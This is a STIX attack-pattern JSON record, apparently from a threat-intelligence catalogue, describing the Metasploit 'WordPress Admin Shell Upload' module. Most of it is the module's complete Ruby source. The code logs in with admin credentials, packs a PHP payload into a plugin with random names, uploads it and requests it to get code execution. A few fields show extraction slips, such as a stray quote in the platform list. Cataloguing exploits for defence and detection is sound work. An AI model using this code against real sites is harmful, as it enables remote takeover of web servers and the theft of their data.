{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--31ebb272-48b7-4e2a-95ed-fb1b1692f941",
    "created": "2024-08-14T17:13:55.856098Z",
    "modified": "2024-08-14T17:13:55.856103Z",
    "name": "WordPress Admin Shell Upload",
    "description": " This module will generate a plugin, pack the payload into it and upload it to a server running WordPress provided valid admin credentials are used.  'License'         => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/wp_admin_shell_upload.rb",
            "external_id": "wp_admin_shell_upload.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/zip'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::Remote::HTTP::Wordpress\n\n  def initialize(info = {})\n    super(update_info(\n      info,\n      'Name'            => 'WordPress Admin Shell Upload',\n      'Description'     => %q{\n          This module will generate a plugin, pack the payload into it\n          and upload it to a server running WordPress provided valid\n          admin credentials are used.\n        },\n      'License'         => MSF_LICENSE,\n      'Author'          =>\n        [\n          'rastating' # Metasploit module\n        ],\n      'DisclosureDate'  => '2015-02-21',\n      'Platform'        => 'php',\n      'Arch'            => ARCH_PHP,\n      'Targets'         => [['WordPress', {}]],\n      'DefaultTarget'   => 0\n    ))\n\n    register_options(\n      [\n        OptString.new('USERNAME', [true, 'The WordPress username to authenticate with']),\n        OptString.new('PASSWORD', [true, 'The WordPress password to authenticate with'])\n      ])\n  end\n\n  def check\n    cookie = wordpress_login(username, password)\n    if cookie.nil?\n      store_valid_credential(user: username, private: password, proof: cookie)\n      return CheckCode::Safe\n    end\n\n    CheckCode::Appears\n  end\n\n  def username\n    datastore['USERNAME']\n  end\n\n  def password\n    datastore['PASSWORD']\n  end\n\n  def generate_plugin(plugin_name, payload_name)\n    plugin_script = %Q{<?php\n/**\n * Plugin Name: #{plugin_name}\n * Version: #{Rex::Text.rand_text_numeric(1)}.#{Rex::Text.rand_text_numeric(1)}.#{Rex::Text.rand_text_numeric(2)}\n * Author: #{Rex::Text.rand_text_alpha(10)}\n * Author URI: http://#{Rex::Text.rand_text_alpha(10)}.com\n * License: GPL2\n */\n?>}\n\n    zip = Rex::Zip::Archive.new(Rex::Zip::CM_STORE)\n    zip.add_file(\"#{plugin_name}/#{plugin_name}.php\", plugin_script)\n    zip.add_file(\"#{plugin_name}/#{payload_name}.php\", payload.encoded)\n    zip\n  end\n\n  def exploit\n    fail_with(Failure::NotFound, 'The target does not appear to be using WordPress') unless wordpress_and_online?\n\n    print_status(\"Authenticating with WordPress using #{username}:#{password}...\")\n    cookie = wordpress_login(username, password)\n    fail_with(Failure::NoAccess, 'Failed to authenticate with WordPress') if cookie.nil?\n    print_good(\"Authenticated with WordPress\")\n    store_valid_credential(user: username, private: password, proof: cookie)\n\n    print_status(\"Preparing payload...\")\n    plugin_name = Rex::Text.rand_text_alpha(10)\n    payload_name = \"#{Rex::Text.rand_text_alpha(10)}\"\n    payload_uri = normalize_uri(wordpress_url_plugins, plugin_name, \"#{payload_name}.php\")\n    zip = generate_plugin(plugin_name, payload_name)\n\n    print_status(\"Uploading payload...\")\n    uploaded = wordpress_upload_plugin(plugin_name, zip.pack, cookie)\n    fail_with(Failure::UnexpectedReply, 'Failed to upload the payload') unless uploaded\n\n    print_status(\"Executing the payload at #{payload_uri}...\")\n    register_files_for_cleanup(\"#{payload_name}.php\")\n    register_files_for_cleanup(\"#{plugin_name}.php\")\n    register_dir_for_cleanup(\"../#{plugin_name}\")\n    send_request_cgi({ 'uri' => payload_uri, 'method' => 'GET' }, 5)\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-02-21",
    "x_mitre_platforms": [
        "php'"
    ]
}